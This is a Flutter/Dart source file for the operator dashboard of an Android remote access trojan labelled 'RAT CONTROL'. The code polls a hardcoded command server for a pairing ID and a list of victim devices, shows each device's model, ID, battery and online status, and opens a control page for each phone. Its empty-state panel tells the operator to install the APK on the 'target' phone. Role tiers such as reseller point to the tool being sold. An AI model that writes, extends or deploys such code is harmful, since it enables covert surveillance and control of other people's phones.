import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'dart:async';
import 'dart:math' as math;
import 'device_permission.dart';
import 'control_panel.dart';

const _kBase = 'http://nodexwarkeren.rexy-host.biz.id:3019';

class _C {
  static const bg       = Color(0xFF0A0A0A);
  static const s1       = Color(0xFF0F0F0F);
  static const s2       = Color(0xFF141414);
  static const s3       = Color(0xFF1A1A1A);
  static const bord     = Color(0xFF262626);
  static const bordGlow = Color(0xFF4A2800);
  static const orange   = Color(0xFFFF8F00);
  static const orangeD  = Color(0xFFE67E00);
  static const orange2  = Color(0xFFFFB300);
  static const orangeL  = Color(0xFFFFD54F);
  static const violet   = Color(0xFFFFA000); // dipakai untuk aksen lain
  static const violetD  = Color(0xFFCC6A00);
  static const green    = Color(0xFF00FF88);
  static const amber    = Color(0xFFFFB300);
  static const red      = Color(0xFFFF3B5C);
  static const gold     = Color(0xFFFFD700);
  static const textP    = Color(0xFFF5F5F5);
  static const textS    = Color(0xFFB0B0B0);
  static const textM    = Color(0xFF666666);
}

class DeviceDashboardPage extends StatefulWidget {
  final String username, role, sessionKey;
  const DeviceDashboardPage({super.key, this.username='', this.role='', this.sessionKey=''});
  @override State<DeviceDashboardPage> createState() => _DDState();
}

class _DDState extends State<DeviceDashboardPage> with TickerProviderStateMixin {
  List<dynamic> _visible = [];
  bool _loading = true;
  String? _errorMsg;
  String _pairId = '';
  PermissionResult? _perm;
  Timer? _timer;
  late AnimationController _pulse, _scanAnim, _shimmer;

  bool get _hasAccess => ['owner','high owner','high admin','admin','vip','reseller'].contains(widget.role.toLowerCase());
  bool get _isOwner   => ['owner','high owner','high admin','admin'].contains(widget.role.toLowerCase());

  @override
  void initState() {
    super.initState();
    _pulse   = AnimationController(vsync:this, duration:const Duration(milliseconds:2000))..repeat(reverse:true);
    _scanAnim= AnimationController(vsync:this, duration:const Duration(seconds:3))..repeat();
    _shimmer = AnimationController(vsync:this, duration:const Duration(milliseconds:2500))..repeat();
    if (_hasAccess) { _loadAll(); _timer = Timer.periodic(const Duration(seconds:20), (_) => _loadAll()); }
  }

  @override void dispose() { _timer?.cancel(); _pulse.dispose(); _scanAnim.dispose(); _shimmer.dispose(); super.dispose(); }

  Future<void> _loadAll() async {
    if (!mounted || !_hasAccess) return;
    try {
      final pRes = await http.get(Uri.parse('$_kBase/rat/pairid?key=${widget.sessionKey}')).timeout(const Duration(seconds:8));
      if (pRes.statusCode==200) { final pd=jsonDecode(pRes.body); if (pd['valid']==true && pd['pairId']!=null && mounted) setState(()=>_pairId=pd['pairId'].toString()); }
      final dRes = await http.get(Uri.parse('$_kBase/rat/my-devices?key=${widget.sessionKey}')).timeout(const Duration(seconds:10));
      if (!mounted) return;
      if (dRes.statusCode!=200) { setState(() { _loading=false; _errorMsg='Server error ${dRes.statusCode}'; }); return; }
      final body = jsonDecode(dRes.body);
      if (body['valid']!=true) { setState(() { _loading=false; _errorMsg=body['message']??'Error'; }); return; }
      List<dynamic> devices = List<dynamic>.from(body['devices']??[]);
      final now = DateTime.now();
      for (var d in devices) {
        try { final seen=DateTime.parse(d['lastSeen']?.toString()??''); d['online']=now.difference(seen).inSeconds<30; } catch(_) { d['online']=false; }
      }
      PermissionResult perm = _isOwner ? PermissionResult(approved:true,allDevices:true,devices:[]) : await DevicePermissionStore.getFor(widget.username,widget.sessionKey);
      if (mounted) setState(() { _visible=devices; _perm=perm; _loading=false; _errorMsg=null; });
    } catch(e) { if (mounted) setState(() { _loading=false; _errorMsg=e.toString(); }); }
  }

  int get _active => _visible.where((d)=>d['online']==true).length;

  void _copyPairId() {
    if (_pairId.isEmpty) return;
    Clipboard.setData(ClipboardData(text:_pairId));
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(
      backgroundColor: _C.s2,
      content: Row(children:[
        Container(width:22,height:22,decoration:BoxDecoration(gradient:const LinearGradient(colors:[_C.orangeD,_C.orange]),shape:BoxShape.circle),
          child:const Icon(Icons.check_rounded,color:_C.bg,size:13)),
        const SizedBox(width:10),
        const Text('Pairing ID tersalin!',style:TextStyle(color:_C.textP,fontSize:12,fontWeight:FontWeight.w600)),
      ]),
      duration:const Duration(seconds:2), behavior:SnackBarBehavior.floating,
      shape:RoundedRectangleBorder(borderRadius:BorderRadius.circular(14)),
      margin:const EdgeInsets.all(16),
    ));
  }

  @override
  Widget build(BuildContext context) {
    if (!_hasAccess) return _accessDenied();
    final denied = _perm!=null && !_perm!.approved && !_isOwner;
    return Scaffold(
      backgroundColor: _C.bg,
      appBar: _buildAppBar(),
      body: Column(children:[
        _buildHeader(),
        if (_errorMsg!=null) _banner(Icons.error_outline_rounded, _errorMsg!, _C.red),
        if (denied && _errorMsg==null) _banner(Icons.lock_outline_rounded,'Akses belum disetujui. Hubungi Owner.',_C.violet),
        if (!_isOwner && !denied && _errorMsg==null && _perm?.approved==true)
          _banner(Icons.verified_user_rounded,'Akses telah diizinkan.',_C.green),
        _buildToolbar(denied),
        Expanded(child:_buildBody(denied)),
      ]),
    );
  }

  PreferredSizeWidget _buildAppBar() => AppBar(
    backgroundColor: _C.s1, elevation:0,
    leading: GestureDetector(
      onTap:()=>Navigator.pop(context),
      child: Container(margin:const EdgeInsets.all(10),
        decoration:BoxDecoration(
          gradient:LinearGradient(colors:[_C.orange.withOpacity(0.12),_C.orange.withOpacity(0.04)]),
          borderRadius:BorderRadius.circular(12),
          border:Border.all(color:_C.orange.withOpacity(0.3))),
        child:const Icon(Icons.arrow_back_ios_new_rounded,color:_C.orange,size:15)),
    ),
    title: Row(children:[
      Container(width:32,height:32,
        decoration:BoxDecoration(
          gradient:const LinearGradient(colors:[_C.orange2,_C.orange,_C.orangeD],begin:Alignment.topLeft,end:Alignment.bottomRight),
          borderRadius:BorderRadius.circular(10),
          boxShadow:[BoxShadow(color:_C.orange.withOpacity(0.5),blurRadius:14,spreadRadius:1)]),
        child:const Icon(Icons.phone_android_rounded,color:_C.bg,size:17)),
      const SizedBox(width:11),
      Column(crossAxisAlignment:CrossAxisAlignment.start,children:[
        const Text('RAT CONTROL',style:TextStyle(color:_C.textP,fontSize:13,fontWeight:FontWeight.w900,letterSpacing:2)),
        Text('by ${widget.username}',style:const TextStyle(color:_C.textS,fontSize:9,letterSpacing:0.5)),
      ]),
    ]),
    actions:[
      AnimatedBuilder(animation:_pulse, builder:(_,__)=>Container(
        margin:const EdgeInsets.symmetric(vertical:14,horizontal:4),
        width:8,height:8,
        decoration:BoxDecoration(shape:BoxShape.circle,
          color:_C.green.withOpacity(0.5+0.5*_pulse.value),
          boxShadow:[BoxShadow(color:_C.green.withOpacity(0.7*_pulse.value),blurRadius:10)]))),
      GestureDetector(
        onTap:(){ setState(() { _loading=true; _errorMsg=null; }); _loadAll(); },
        child:Container(
          margin:const EdgeInsets.symmetric(vertical:12,horizontal:10),
          padding:const EdgeInsets.symmetric(horizontal:14,vertical:7),
          decoration:BoxDecoration(
            gradient:LinearGradient(colors:[_C.orange.withOpacity(0.12),_C.orange.withOpacity(0.04)]),
            borderRadius:BorderRadius.circular(10),
            border:Border.all(color:_C.orange.withOpacity(0.35))),
          child:Row(mainAxisSize:MainAxisSize.min,children:[
            const Icon(Icons.sync_rounded,color:_C.orange,size:13),
            const SizedBox(width:5),
            const Text('SYNC',style:TextStyle(color:_C.orange,fontSize:9,fontWeight:FontWeight.w900,letterSpacing:1.5)),
          ]))),
    ],
    bottom:PreferredSize(preferredSize:const Size.fromHeight(1),
      child:Container(height:1,decoration:BoxDecoration(
        gradient:LinearGradient(colors:[Colors.transparent,_C.orange.withOpacity(0.6),_C.violet.withOpacity(0.3),Colors.transparent])))),
  );

  Widget _buildHeader() => Container(
    decoration:BoxDecoration(color:_C.s1,border:Border(bottom:BorderSide(color:_C.bord))),
    child:Column(children:[
      Padding(padding:const EdgeInsets.fromLTRB(14,14,14,0),
        child:Row(children:[
          _statCard('ONLINE','$_active',_C.green,Icons.wifi_rounded),
          const SizedBox(width:8),
          _statCard('OFFLINE','${_visible.length-_active}',_C.red,Icons.wifi_off_rounded),
          const SizedBox(width:8),
          _statCard('TOTAL','${_visible.length}',_C.orange,Icons.devices_rounded),
        ])),
      if (_pairId.isNotEmpty) ...[
        const SizedBox(height:12),
        Padding(padding:const EdgeInsets.fromLTRB(14,0,14,14),
          child:GestureDetector(
            onTap:_copyPairId,
            child:AnimatedBuilder(animation:_pulse, builder:(_,__)=>Container(
              padding:const EdgeInsets.symmetric(horizontal:16,vertical:14),
              decoration:BoxDecoration(
                gradient:LinearGradient(colors:[_C.orange.withOpacity(0.06),_C.violet.withOpacity(0.03),_C.s2],begin:Alignment.topLeft,end:Alignment.bottomRight),
                borderRadius:BorderRadius.circular(16),
                border:Border.all(color:_C.orange.withOpacity(0.18+0.1*_pulse.value),width:1.2),
                boxShadow:[BoxShadow(color:_C.orange.withOpacity(0.06*_pulse.value),blurRadius:20)]),
              child:Row(children:[
                Container(width:40,height:40,
                  decoration:BoxDecoration(
                    gradient:LinearGradient(colors:[_C.orange.withOpacity(0.18),_C.orange.withOpacity(0.06)]),
                    borderRadius:BorderRadius.circular(12),
                    border:Border.all(color:_C.orange.withOpacity(0.35))),
                  child:const Icon(Icons.qr_code_2_rounded,color:_C.orange,size:20)),
                const SizedBox(width:14),
                Expanded(child:Column(crossAxisAlignment:CrossAxisAlignment.start,children:[
                  const Text('PAIRING ID',style:TextStyle(color:_C.textS,fontSize:8,letterSpacing:3,fontWeight:FontWeight.w700)),
                  const SizedBox(height:6),
                  Text(_pairId,style:const TextStyle(color:_C.orange,fontSize:15,fontWeight:FontWeight.w900,letterSpacing:4)),
                ])),
                Container(padding:const EdgeInsets.symmetric(horizontal:12,vertical:9),
                  decoration:BoxDecoration(
                    gradient:LinearGradient(colors:[_C.orange.withOpacity(0.18),_C.orange.withOpacity(0.06)]),
                    borderRadius:BorderRadius.circular(10),
                    border:Border.all(color:_C.orange.withOpacity(0.35))),
                  child:Column(children:[
                    const Icon(Icons.copy_all_rounded,color:_C.orange,size:16),
                    const SizedBox(height:2),
                    Text('COPY',style:TextStyle(color:_C.orange.withOpacity(0.7),fontSize:6,letterSpacing:1.5,fontWeight:FontWeight.w800)),
                  ])),
              ]))))),
      ] else const SizedBox(height:14),
    ]),
  );

  Widget _statCard(String label, String val, Color c, IconData icon) => Expanded(child:Container(
    padding:const EdgeInsets.symmetric(vertical:12,horizontal:12),
    decoration:BoxDecoration(
      gradient:LinearGradient(colors:[c.withOpacity(0.1),c.withOpacity(0.02)],begin:Alignment.topLeft,end:Alignment.bottomRight),
      borderRadius:BorderRadius.circular(14),
      border:Border.all(color:c.withOpacity(0.25)),
      boxShadow:[BoxShadow(color:c.withOpacity(0.05),blurRadius:12)]),
    child:Row(children:[
      Container(width:32,height:32,
        decoration:BoxDecoration(gradient:LinearGradient(colors:[c.withOpacity(0.2),c.withOpacity(0.06)]),borderRadius:BorderRadius.circular(10),border:Border.all(color:c.withOpacity(0.3))),
        child:Icon(icon,color:c,size:15)),
      const SizedBox(width:8),
      Column(crossAxisAlignment:CrossAxisAlignment.start,children:[
        Text(val,style:TextStyle(color:c,fontSize:20,fontWeight:FontWeight.w900,height:1)),
        Text(label,style:const TextStyle(color:_C.textS,fontSize:7,letterSpacing:2,fontWeight:FontWeight.w700)),
      ]),
    ]),
  ));

  Widget _buildToolbar(bool denied) => Padding(
    padding:const EdgeInsets.fromLTRB(14,12,14,6),
    child:Row(children:[
      Row(children:[
        Container(width:4,height:16,decoration:BoxDecoration(
          gradient:const LinearGradient(colors:[_C.orange,_C.violet],begin:Alignment.topCenter,end:Alignment.bottomCenter),
          borderRadius:BorderRadius.circular(3),
          boxShadow:[BoxShadow(color:_C.orange.withOpacity(0.6),blurRadius:8)])),
        const SizedBox(width:10),
        const Text('DEVICE LIST',style:TextStyle(color:_C.textP,fontSize:11,fontWeight:FontWeight.w800,letterSpacing:2)),
      ]),
      const Spacer(),
      if (_isOwner) GestureDetector(
        onTap:() async { await Navigator.push(context,MaterialPageRoute(builder:(_)=>DevicePermissionManagerPage(sessionKey:widget.sessionKey,allDevices:_visible))); _loadAll(); },
        child:Container(
          padding:const EdgeInsets.symmetric(horizontal:16,vertical:8),
          decoration:BoxDecoration(
            gradient:LinearGradient(colors:[_C.violet.withOpacity(0.18),_C.violet.withOpacity(0.06)]),
            borderRadius:BorderRadius.circular(12),
            border:Border.all(color:_C.violet.withOpacity(0.45)),
            boxShadow:[BoxShadow(color:_C.violet.withOpacity(0.15),blurRadius:12)]),
          child:Row(mainAxisSize:MainAxisSize.min,children:[
            const Icon(Icons.shield_rounded,color:_C.violet,size:14),
            const SizedBox(width:7),
            const Text('AKSES',style:TextStyle(color:_C.violet,fontSize:10,fontWeight:FontWeight.w900,letterSpacing:1)),
          ]))),
    ]),
  );

  Widget _buildBody(bool denied) {
    if (_loading) return _loadingState();
    if (_visible.isEmpty) return _emptyState(denied);
    return GridView.builder(
      padding:const EdgeInsets.fromLTRB(12,4,12,30),
      gridDelegate:const SliverGridDelegateWithFixedCrossAxisCount(crossAxisCount:2,crossAxisSpacing:10,mainAxisSpacing:10,childAspectRatio:1.05),
      itemCount:_visible.length,
      itemBuilder:(ctx,i)=>_deviceCard(ctx,_visible[i]));
  }

  Widget _deviceCard(BuildContext ctx, dynamic device) {
    final d  = Map<String,dynamic>.from(device as Map);
    final on = d['online']==true;
    final batt = int.tryParse(d['battery']?.toString()??'0')??0;
    Color battColor = batt>60 ? _C.green : batt>25 ? _C.amber : _C.red;
    return GestureDetector(
      onTap:()=>Navigator.push(ctx,MaterialPageRoute(builder:(_)=>ControlCenterPage(targetDevice:d,role:widget.role))),
      child:AnimatedContainer(
        duration:const Duration(milliseconds:300),
        decoration:BoxDecoration(
          gradient:LinearGradient(
            colors:on ? [_C.s3,_C.s2,_C.s1] : [_C.s1,_C.bg],
            begin:Alignment.topLeft,end:Alignment.bottomRight),
          borderRadius:BorderRadius.circular(20),
          border:Border.all(color:on ? _C.orange.withOpacity(0.35) : _C.bord,width:on ? 1.5 : 1),
          boxShadow:on ? [BoxShadow(color:_C.orange.withOpacity(0.1),blurRadius:24,spreadRadius:1)] : []),
        child:Stack(children:[
          if (on) Positioned(top:-15,right:-15,
            child:Container(width:70,height:70,decoration:BoxDecoration(shape:BoxShape.circle,color:_C.orange.withOpacity(0.05)))),
          if (on) Positioned(bottom:-10,left:-10,
            child:Container(width:40,height:40,decoration:BoxDecoration(shape:BoxShape.circle,color:_C.violet.withOpacity(0.04)))),
          Padding(padding:const EdgeInsets.all(14),
            child:Column(crossAxisAlignment:CrossAxisAlignment.start,children:[
              Row(mainAxisAlignment:MainAxisAlignment.spaceBetween,children:[
                Container(width:42,height:42,
                  decoration:BoxDecoration(
                    gradient:LinearGradient(colors:on ? [_C.orange.withOpacity(0.2),_C.orange.withOpacity(0.06)] : [_C.s3,_C.s2]),
                    borderRadius:BorderRadius.circular(14),
                    border:Border.all(color:on ? _C.orange.withOpacity(0.4) : _C.bord),
                    boxShadow:on ? [BoxShadow(color:_C.orange.withOpacity(0.2),blurRadius:10)] : []),
                  child:Icon(Icons.phone_android_rounded,color:on ? _C.orange : _C.textM,size:20)),
                Container(padding:const EdgeInsets.symmetric(horizontal:9,vertical:5),
                  decoration:BoxDecoration(
                    gradient:LinearGradient(colors:on ? [_C.green.withOpacity(0.18),_C.green.withOpacity(0.06)] : [_C.red.withOpacity(0.12),_C.red.withOpacity(0.04)]),
                    borderRadius:BorderRadius.circular(20),
                    border:Border.all(color:(on ? _C.green : _C.red).withOpacity(0.4))),
                  child:Row(mainAxisSize:MainAxisSize.min,children:[
                    AnimatedBuilder(animation:_pulse,builder:(_,__)=>Container(width:6,height:6,
                      decoration:BoxDecoration(shape:BoxShape.circle,
                        color:on ? _C.green : _C.red,
                        boxShadow:[BoxShadow(color:(on?_C.green:_C.red).withOpacity(on?0.8*_pulse.value:0.5),blurRadius:6)]))),
                    const SizedBox(width:5),
                    Text(on ? 'LIVE' : 'OFF',style:TextStyle(color:on?_C.green:_C.red,fontSize:8,fontWeight:FontWeight.w900,letterSpacing:1)),
                  ])),
              ]),
              const Spacer(),
              Text(d['model']?.toString()??'Unknown Device',style:const TextStyle(color:_C.textP,fontSize:12,fontWeight:FontWeight.w800),maxLines:1,overflow:TextOverflow.ellipsis),
              const SizedBox(height:3),
              Text(d['id']?.toString()??'-',style:const TextStyle(color:_C.textS,fontSize:9),maxLines:1,overflow:TextOverflow.ellipsis),
              const SizedBox(height:10),
              Row(children:[
                Icon(batt>60 ? Icons.battery_full_rounded : batt>25 ? Icons.battery_4_bar_rounded : Icons.battery_alert_rounded, color:battColor,size:13),
                const SizedBox(width:4),
                Text('$batt%',style:TextStyle(color:battColor,fontSize:10,fontWeight:FontWeight.w700)),
                const Spacer(),
                Container(padding:const EdgeInsets.symmetric(horizontal:10,vertical:5),
                  decoration:BoxDecoration(
                    gradient:const LinearGradient(colors:[_C.orangeD,_C.orange]),
                    borderRadius:BorderRadius.circular(8),
                    boxShadow:[BoxShadow(color:_C.orange.withOpacity(0.3),blurRadius:8)]),
                  child:const Text('OPEN',style:TextStyle(color:_C.bg,fontSize:8,fontWeight:FontWeight.w900,letterSpacing:1))),
              ]),
            ])),
        ])),
    );
  }

  Widget _loadingState() => Center(child:Column(mainAxisSize:MainAxisSize.min,children:[
    AnimatedBuilder(animation:_scanAnim, builder:(_,__)=>CustomPaint(size:const Size(70,70),painter:_ScanPainter(_scanAnim.value))),
    const SizedBox(height:22),
    const Text('SCANNING DEVICES',style:TextStyle(color:_C.textS,fontSize:10,letterSpacing:3)),
    const SizedBox(height:6),
    Text('Mengambil data...',style:const TextStyle(color:_C.textM,fontSize:10)),
  ]));

  Widget _emptyState(bool denied) => Center(child:Column(mainAxisSize:MainAxisSize.min,children:[
    Container(width:90,height:90,
      decoration:BoxDecoration(shape:BoxShape.circle,
        gradient:RadialGradient(colors:[denied?_C.violet.withOpacity(0.12):_C.orange.withOpacity(0.08),Colors.transparent]),
        border:Border.all(color:denied?_C.violet.withOpacity(0.3):_C.bord,width:1.5)),
      child:Icon(denied?Icons.lock_person_rounded:Icons.devices_other_rounded,color:denied?_C.violet:_C.textM,size:40)),
    const SizedBox(height:20),
    Text(denied?'AKSES DITOLAK':'NO DEVICE',style:const TextStyle(color:_C.textS,fontWeight:FontWeight.w900,letterSpacing:3,fontSize:13)),
    const SizedBox(height:8),
    Text(denied?'Hubungi Owner untuk mendapat akses':'Belum ada device terhubung',style:const TextStyle(color:_C.textM,fontSize:11)),
    if (!denied)...[
      const SizedBox(height:28),
      Container(margin:const EdgeInsets.symmetric(horizontal:28),padding:const EdgeInsets.all(20),
        decoration:BoxDecoration(
          gradient:LinearGradient(colors:[_C.s2,_C.s1],begin:Alignment.topLeft,end:Alignment.bottomRight),
          borderRadius:BorderRadius.circular(20),
          border:Border.all(color:_C.bord)),
        child:Row(crossAxisAlignment:CrossAxisAlignment.start,children:[
          Container(width:4,height:72,decoration:BoxDecoration(gradient:const LinearGradient(colors:[_C.orange,_C.violet],begin:Alignment.topCenter,end:Alignment.bottomCenter),borderRadius:BorderRadius.circular(3))),
          const SizedBox(width:14),
          const Expanded(child:Column(crossAxisAlignment:CrossAxisAlignment.start,children:[
            Text('CARA MENGHUBUNGKAN',style:TextStyle(color:_C.textP,fontSize:11,fontWeight:FontWeight.w900,letterSpacing:1)),
            SizedBox(height:10),
            Text('1. Install APK di HP target',style:TextStyle(color:_C.textS,fontSize:11,height:1.9)),
            Text('2. Masukkan Pairing ID di atas',style:TextStyle(color:_C.textS,fontSize:11,height:1.9)),
            Text('3. Device muncul otomatis',style:TextStyle(color:_C.textS,fontSize:11,height:1.9)),
          ])),
        ])),
    ],
  ]));

  Widget _accessDenied() => Scaffold(
    backgroundColor:_C.bg,
    body:Center(child:Padding(padding:const EdgeInsets.all(32),
      child:Column(mainAxisAlignment:MainAxisAlignment.center,children:[
        Container(width:100,height:100,
          decoration:BoxDecoration(shape:BoxShape.circle,
            gradient:RadialGradient(colors:[_C.violet.withOpacity(0.2),Colors.transparent]),
            border:Border.all(color:_C.violet.withOpacity(0.4),width:1.5),
            boxShadow:[BoxShadow(color:_C.violet.withOpacity(0.15),blurRadius:30)]),
          child:const Icon(Icons.lock_person_rounded,color:_C.violet,size:48)),
        const SizedBox(height:28),
        const Text('AKSES TERBATAS',style:TextStyle(color:_C.textP,fontSize:18,fontWeight:FontWeight.w900,letterSpacing:3)),
        const SizedBox(height:12),
        Text('Role ${widget.role.toUpperCase()} tidak memiliki akses.',style:const TextStyle(color:_C.textS,fontSize:12,height:1.6),textAlign:TextAlign.center),
        const SizedBox(height:32),
        GestureDetector(onTap:()=>Navigator.pop(context),
          child:Container(padding:const EdgeInsets.symmetric(horizontal:40,vertical:15),
            decoration:BoxDecoration(gradient:const LinearGradient(colors:[_C.orangeD,_C.orange]),borderRadius:BorderRadius.circular(16),boxShadow:[BoxShadow(color:_C.orange.withOpacity(0.35),blurRadius:20)]),
            child:const Text('KEMBALI',style:TextStyle(color:_C.bg,fontWeight:FontWeight.w900,fontSize:13,letterSpacing:2)))),
      ]))),
  );

  Widget _banner(IconData icon, String msg, Color c) => Container(
    margin:const EdgeInsets.fromLTRB(14,8,14,0),
    padding:const EdgeInsets.symmetric(horizontal:14,vertical:11),
    decoration:BoxDecoration(
      gradient:LinearGradient(colors:[c.withOpacity(0.08),c.withOpacity(0.02)]),
      borderRadius:BorderRadius.circular(13),
      border:Border.all(color:c.withOpacity(0.3))),
    child:Row(children:[
      Container(width:26,height:26,decoration:BoxDecoration(color:c.withOpacity(0.12),borderRadius:BorderRadius.circular(8)),child:Icon(icon,color:c,size:14)),
      const SizedBox(width:10),
      Expanded(child:Text(msg,style:TextStyle(color:c.withOpacity(0.9),fontSize:11,fontWeight:FontWeight.w600))),
    ]),
  );
}

class _ScanPainter extends CustomPainter {
  final double t;
  _ScanPainter(this.t);
  @override
  void paint(Canvas canvas, Size size) {
    final c = size.center(Offset.zero);
    final r = size.width/2;
    for (int i=0;i<3;i++) {
      final op=(1-((t+i*0.33)%1.0))*0.6;
      canvas.drawCircle(c,r*((t+i*0.33)%1.0),Paint()..color=const Color(0xFFFF8F00).withOpacity(op)..style=PaintingStyle.stroke..strokeWidth=1.5);
    }
    final grad=Paint()..shader=RadialGradient(colors:[const Color(0xFFFFB300),const Color(0xFFFF8F00)]).createShader(Rect.fromCircle(center:c,radius:10));
    canvas.drawCircle(c,9,grad);
    canvas.drawCircle(c,5,Paint()..color=const Color(0xFF0A0A0A));
    final sweep=t*2*math.pi;
    final sweepPaint=Paint()..shader=SweepGradient(colors:[Colors.transparent,const Color(0xFFFF8F00).withOpacity(0.8)],endAngle:sweep,startAngle:0).createShader(Rect.fromCircle(center:c,radius:r*0.7))..strokeWidth=2.5..style=PaintingStyle.stroke;
    canvas.drawArc(Rect.fromCircle(center:c,radius:r*0.7),-math.pi/2,sweep,false,sweepPaint);
  }
  @override bool shouldRepaint(_ScanPainter o)=>o.t!=t;
}